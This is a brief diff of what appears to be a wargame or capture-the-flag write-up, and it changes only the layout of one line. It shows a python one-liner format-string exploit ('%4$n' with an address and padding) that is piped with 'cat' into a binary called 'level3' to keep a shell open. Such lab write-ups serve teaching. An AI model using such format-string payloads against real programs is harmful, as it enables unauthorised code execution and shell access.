@@ -34,4 +34,5 @@ python -c  'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'
 
 Just add a cat to get control over the shell and we're good.
 
-Exploit: (python -c  'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"';cat) | ./level3
+Exploit:
+(python -c  'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"';cat) | ./level3
